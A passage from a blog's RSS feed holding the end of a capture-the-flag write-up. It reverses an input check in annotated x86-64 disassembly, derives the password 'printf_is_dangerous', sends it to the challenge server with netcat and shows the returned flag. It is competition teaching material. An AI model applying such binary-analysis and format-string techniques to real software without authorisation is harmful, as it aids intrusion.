+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rsp&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rsp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rdi&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;# [rdp+var_8] is our input string (s)
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;sub_401060&lt;/span&gt;          &lt;span class=&#34;c&#34;&gt;# some libc function with a string parameter - len!
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;            &lt;span class=&#34;c&#34;&gt;# [1] len(s) == 19 (0x13)
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_4011BA&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;              &lt;span class=&#34;c&#34;&gt;# s[6]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Fh&lt;/span&gt;             &lt;span class=&#34;c&#34;&gt;# [2] s[6] == &amp;#39;_&amp;#39; (0x5f)
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jnz&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_4011E3&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# edx = s[9]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# eax = s[6]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;dl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;              &lt;span class=&#34;c&#34;&gt;# [3] s[6] == s[9]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_4011ED&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;aPrintf_0&lt;/span&gt;  &lt;span class=&#34;c&#34;&gt;; &amp;#34;printf&amp;#34; # aww IDA is so nice
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;sub_401040&lt;/span&gt;          &lt;span class=&#34;c&#34;&gt;# some libc function with two string parameters (one is constant)
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;test&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;            &lt;span class=&#34;c&#34;&gt;# probably strcmp
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_401213&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;# [4] s[:6] == &amp;#34;printf&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Ah&lt;/span&gt;            &lt;span class=&#34;c&#34;&gt;# start at s[10]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;aDanger&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;; &amp;#34;danger&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;sub_401040&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;test&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;            &lt;span class=&#34;c&#34;&gt;# [5] s[10:16] == &amp;#34;danger&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_40123D&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;73&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;             &lt;span class=&#34;c&#34;&gt;# [6] s[18] == &amp;#39;s&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_401253&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;75&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;             &lt;span class=&#34;c&#34;&gt;# [7] s[17] == &amp;#39;u&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_401269&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Fh&lt;/span&gt;             &lt;span class=&#34;c&#34;&gt;# [8] s[16] == &amp;#39;o&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_40127F&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;dl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;               &lt;span class=&#34;c&#34;&gt;# [9] s[2] == s[7]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_4012A0&lt;/span&gt;
+
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;var_8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;h&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;movzx&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;no&#34;&gt;dl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;al&lt;/span&gt;               &lt;span class=&#34;c&#34;&gt;# [10] s[8] == s[18]
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;jz&lt;/span&gt;      &lt;span class=&#34;no&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;loc_4012C1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Putting them together, we have:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;len(s) == 19
+s[6] == &#39;_&#39;
+s[6] == s[9]
+s[:6] == &amp;quot;printf&amp;quot;
+s[10:16] == &amp;quot;danger&amp;quot;
+s[18] == &#39;s&#39;
+s[17] == &#39;u&#39;
+s[16] == &#39;o&#39;
+s[2] == s[7]
+s[8] == s[18]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No, don&amp;rsquo;t start writing a z3 solver script yet. Get your pen and paper and try it out!&lt;/p&gt;
+&lt;p&gt;Finally, we get that &lt;code&gt;s == printf_is_dangerous&lt;/code&gt;. Supplying it to the remote server gives&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;❯ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; printf_is_dangerous &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+hkcert21&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;l3akinG_the_world_giVE_U_7H3_FLAG&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag: &lt;code&gt;hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;extra-material&#34;&gt;Extra Material&lt;/h2&gt;
+&lt;p&gt;If this is your first time seeing blind format string, here are some good writeups from previous challenges:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=XuzuFUGuQv0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;33C3CTF ESPR&lt;/a&gt; by LiveOverflow&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.da.vidbuchanan.co.uk/blog/HITB-XCTF-2018-babypwn.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HITB-XCTF GSEC 2018&lt;/a&gt; by David Buchanan&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
     </channel>
 </rss>
